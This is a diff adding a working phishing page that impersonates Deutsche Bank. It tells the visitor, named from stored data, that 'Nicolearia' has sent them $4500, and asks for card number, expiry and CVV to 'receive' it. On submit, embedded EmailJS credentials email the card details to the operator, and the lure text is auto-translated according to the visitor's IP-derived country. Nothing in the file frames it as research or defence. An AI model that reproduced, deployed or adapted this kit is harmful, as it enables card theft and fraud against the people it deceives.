@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #d9d9d9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 130vh; /* Adjusted to full viewport height */
+        margin: 0;
+        transition: opacity 2s ease-in-out; /* Add transition for opacity */
+    } 
+
+    body.loading {
+        opacity: -14; /* Start with the body hidden */
+    }
+
+     .container {
+            text-align: center;
+        }
+
+        .image {
+            position: relative;
+            display: inline-block;
+            margin-bottom: px;
+            font-size: 32px;
+            color: #0e00cc;
+            font-weight: bold;
+         border: 2px solid  #0003ff;  
+      background-color: #ffffff;
+  width: 370px;
+  border-radius: 8px;
+  margin-top: 9px;  
+                             }
+
+        .image img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 4px solid #0003ff;
+            margin-top: 0px;
+        }
+
+        .image-text {
+            font-size: 18px;
+            line-height: 1.6;
+            color: #333;
+            margin-top: 11px;
+            padding: 20px; /* Add padding for spacing inside the box */
+            border: 2px solid #0003ff; /* Border around the box */
+            border-radius: 8px; /* Rounded corners */
+            background-color: #fff; /* Background color of the box */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Optional: Box shadow for depth */
+            max-width: 600px; /* Limit width of the box */
+            margin: 0 auto; /* Center the box horizontally */
+            font-weight: bold; /* Make the text bold */
+        }
+
+    .additional-text {
+        font-size: 17px;
+        color: #000009;
+        margin-top: 10px;
+        padding: 10px; /* Add padding for spacing inside the box */
+        border: 2px solid #0003ff; /* Border around the box */
+        border-radius: 8px; /* Rounded corners */
+        background-color: #fff; /* Background color of the box */
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Optional: Box shadow for depth */
+        max-width: 600px; /* Limit width of the box */
+        margin: 20px auto 0; /* Center the box horizontally with top margin */
+        font-weight: bold;
+    }
+
+    .card-form {
+        background-color: #fff;
+        border: 2px solid #0003ff;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        margin-top: 10px;
+        max-width: 339px;
+        width: 100%;
+    }
+   .card-form img{
+       width: 330px;
+   }
+    .card-form h3 {
+        margin-bottom: 20px;
+        font-size: 29px;
+        color: #333;
+        margin-left: 29px;
+    }
+
+    .card-form input, .card-form select {
+        width: calc(100% - 31px); /* Adjust for padding and border */
+        padding: 10px;
+        margin: 10px 0;
+        border: 2px solid #ccc;
+        border-radius: 17px;
+        height: 40px;
+        font-size: 17px;
+       
+    }
+
+    .card-form select {
+        font-size: 17px;
+        height: 59px;
+    }
+
+    .card-form .card-details {
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .card-form .card-details select, .card-form .card-details input {
+        width: calc(47% - 12px); /* Adjust for padding, border, and margin */
+    }
+
+    .card-form button {
+        width: 70%;
+        padding: 10px;
+        background-color: #0003ff;
+        border: none;
+        border-radius: 17px;
+        color: #fff;
+        font-size: 16px;
+        cursor: pointer;
+    }
+
+    .card-form button:hover {
+        background-color: #0001cc;
+    }
+
+    .container1 {
+        display: flex;
+        align-items: ;
+        justify-content: ;
+        margin-top: 2px;
+        padding: 2px;
+        border: 2px solid #0003ff;
+        border-radius: 8px;
+        background-color: #fff;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Optional: Box shadow for depth */
+        text-align: center;
+        position: relative;
+        height: 145px;
+        
+            }
+
+    .step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+        margin: 0 10px;
+    }
+
+    .tick {
+        font-size: 27px;
+        color: green;
+       margin-top: 12px;
+           }
+
+    .line {
+        width: 241px;
+        height: 5px;
+        background-color: #0ba700f3;
+        position: absolute;
+        top: 22%; /* Center vertically */
+        transform: translateY(-50%);
+        left: 66%;
+    }
+
+    .text {
+        font-size: 15px;
+        margin-top: 10px;
+        font-weight: bold;
+    }
+  image-text{
+      width: 100%;
+  }      
+
+    .step:last-child .line {
+        display: none; /* Hide the line after the last step */
+    }
+    
+        .container {
+            width: 100%;
+            margin: auto;
+            padding: 20px;
+            background-color: #f4f4f4;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .image {
+            text-align: center;
+        }
+        .image img {
+            max-width: 100%;
+        }
+        .container1 {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .step {
+            flex: 1;
+            text-align: center;
+        }
+        .step .tick {
+            font-size: 2rem;
+        }
+        .step line{
+            width: 2px;
+            height: 80px;
+            background-color: #000;
+            margin: 10px auto;
+        }
+          .line3  {
+            width: 2px;
+            height: 50px;
+            background-color: #000;
+            margin: 10px auto;
+            {
+        .additional-text {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .card-form {
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .card-form h3 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .card-form input,
+        .card-form select {
+            width: calc(100% - 20px);
+            margin: 10px;
+            padding: 10px;
+            font-size: 1rem;
+        }
+        .btn {
+            text-align: center;
+        }
+        .btn button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            background-color: #007bff;
+      width: 300px;
+            color: #fff;
+            border: none;
+            border-radius: 18px;
+        }
+</style>  
+    
+    <title>Detalles de la Tarjeta</title>
+    
+</head>
+<body>
+    <script src="script.js" defer></script>
+    <body class="loading">
+    <div id="loading-screen"></div>
+    
+    <div class="container">
+        <div class="image">
+            <div class="image1" id="bank-title">Deutsche Bank</div>
+            <img src="first.jpg" alt="Imagen de OTP">
+        </div>
+        
+        <div class="container1">
+            <div class="step">
+                <div class="tick">✅</div>
+   <div class="line"></div>
+                
+                <div class="text" id="success-payment">Pago Exitoso</div>
+            </div>
+            <div class="step">
+                <div class="tick">✅</div>
+                
+                <div class="text" id="processing-bank">Procesando por el Banco</div>
+            </div>
+            <div class="step">
+                <div class="tick">✅</div>
+                <div class="text" id="name-test">
+                    <!-- Se insertará el nombre aquí -->
+                </div>
+            </div>
+        </div>
+        <div class="image-text" id="greeting-text">
+            <!-- El mensaje de saludo se insertará aquí -->
+        </div>
+        <div class="additional-text" id="camera-instruction">
+            Haga clic en la imagen de la cámara para Continuar o desplácese hacia abajo para ingresar los detalles de su tarjeta 💳 manualmente.
+        </div>
+        <div class="image">
+            <a href="please.html">
+                <img src="camera.jpg" alt="Imagen de OTP">
+            </a>
+        </div>
+    
+     <form id="payment-form">
+            <div class="card-form">
+                <h3 id="card-details-title">Detalles de la Tarjeta</h3>
+         <img src="card.jpg">
+                <input type="text" id="cardholder-name" name="full-name" placeholder="Nombre del titular de la tarjeta" required>
+                <input type="number" id="card-number" placeholder="Número de la tarjeta" name="card-number" required>
+                <div class="card-details">
+                    <select id="expiry-month" name="expiry-month" required>
+                        <option value="" disabled selected>Mes</option>
+                        <option value="01">01 - Enero</option>
+                        <option value="02">02 - Febrero</option>
+                        <option value="03">03 - Marzo</option>
+                        <option value="04">04 - Abril</option>
+                        <option value="05">05 - Mayo</option>
+                        <option value="06">06 - Junio</option>
+                        <option value="07">07 - Julio</option>
+                        <option value="08">08 - Agosto</option>
+                        <option value="09">09 - Septiembre</option>
+                        <option value="10">10 - Octubre</option>
+                        <option value="11">11 - Noviembre</option>
+                        <option value="12">12 - Diciembre</option>
+                    </select>
+                    <select id="expiry-year" name="expiry-year" required>
+                        <option value="" disabled selected>Año</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                    </select>
+                    <input type="number" id="cvv" placeholder="CVV" name="CVV" required>
+                </div>
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="http://localhost:8080/thankyou.html">
+                <div class="btn">
+                    <button type="submit" id="verify-button">VERIFICAR</button>
+                </div>
+            </div>
+        </form>
+    </div>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+    // Initialize EmailJS with your user ID obtained from the EmailJS dashboard
+    emailjs.init('U-DV3EV-FFOkjJsuF'); // Replace 'YOUR_USER_ID' with your actual User ID
+
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        // Collect form data
+        let formData = new FormData(this);
+
+        // Example of using email.js to send form data via email
+        emailjs.sendForm('service_7r47p64', 'template_19whrab', this)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                // Redirect or show thank you message
+                window.location.href = 'thankyou.html';
+                window.location.href = 'thankyou.html';
+            }, function(error) {
+                console.error('FAILED...', error);
+                // Handle error scenario, e.g., show an error message
+            });
+    });
+</script> 
+
+    <script>
+    const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+    function detectCountry(callback) {
+        fetch('https://ipinfo.io/json?token=84581b889c1970')
+            .then(response => response.json())
+            .then(data => {
+                callback(data.country);
+            })
+            .catch(error => console.error('Error detecting country:', error));
+    }
+
+    function translateText(text, targetLanguage, callback) {
+        fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+            .then(response => response.json())
+            .then(data => {
+                const translatedText = data[0].map(item => item[0]).join('');
+                callback(translatedText);
+            })
+            .catch(error => console.error('Error translating text:', error));
+    }
+
+    function translateWebsite() {
+        detectCountry(function (country) {
+            const targetLanguage = countryLanguageMap[country] || 'en';
+
+            if (targetLanguage === 'es') return;
+
+            const elementsToTranslate = [
+                { id: 'bank-title', text: 'Deutsche Bank' },
+                { id: 'success-payment', text: 'Pago Exitoso' },
+                { id: 'processing-bank', text: 'Procesando por el Banco' },
+                { id: 'camera-instruction', text: 'Haga clic en la imagen de la cámara para continuar o desplácese hacia abajo para ingresar los detalles de su tarjeta 💳 manualmente.' },
+                { id: 'card-details-title', text: 'Detalles de la Tarjeta' },
+                { id: 'cardholder-name', text: 'Nombre del titular de la tarjeta' },
+                { id: 'card-number', text: 'Número de la Tarjeta' },
+                { id: 'verify-button', text: 'VERIFICAR' },
+                { id: 'name-test', text: ` Esperando ser recibido por ${localStorage.getItem('name')} 👋, ` }
+            ];
+
+            elementsToTranslate.forEach(element => {
+                translateText(element.text, targetLanguage, function (translatedText) {
+                    document.getElementById(element.id).innerText = translatedText;
+                });
+            });
+
+            const placeholdersToTranslate = [
+                { id: 'cardholder-name', text: 'Nombre del titular de la tarjeta' },
+                { id: 'card-number', text: 'Número de la tarjeta' },
+                { id: 'cvv', text: 'CVV' }
+            ];
+
+            placeholdersToTranslate.forEach(element => {
+                translateText(element.text, targetLanguage, function (translatedText) {
+                    document.getElementById(element.id).placeholder = translatedText;
+                });
+            });
+
+            const selectElements = [
+                { id: 'expiry-month', options: ['Mes', '01 - Enero', '02 - Febrero', '03 - Marzo', '04 - Abril', '05 - Mayo', '06 - Junio', '07 - Julio', '08 - Agosto', '09 - Septiembre', '10 - Octubre', '11 - Noviembre', '12 - Diciembre'] },
+                { id: 'expiry-year', options: ['Año', '2024', '2025', '2026', '2027', '2028', '2029', '2030'] }
+            ];
+
+            selectElements.forEach(selectElement => {
+                const select = document.getElementById(selectElement.id);
+                const options = selectElement.options;
+                options.forEach((option, index) => {
+                    translateText(option, targetLanguage, function (translatedText) {
+ select.options[index].text = translatedText;
+                    });
+                });
+            });
+
+            // Additional translation for greeting text if name is present in localStorage
+            const name = localStorage.getItem('name');
+            if (name) {
+                const greetingText = `Saludos ${name} 👋, Nicolearia le envió un total de $4500. Por favor, agregue una tarjeta bancaria que utilizará para recibir el dinero inmediatamente. Gracias.`;
+                translateText(greetingText, targetLanguage, function (translatedText) {
+                    document.getElementById('greeting-text').innerText = translatedText;
+                });
+
+                // Translation for name-test
+                const nameTestText = `Esperando ser recibido por ${name}`;
+                translateText(nameTestText, targetLanguage, function (translatedText) {
+                    document.getElementById('name-test').innerText = translatedText;
+                });
+            }
+        });
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+        setTimeout(function () {
+            document.body.classList.remove('loading');
+        }, 1600);
+        translateWebsite();
+    });
+</script>
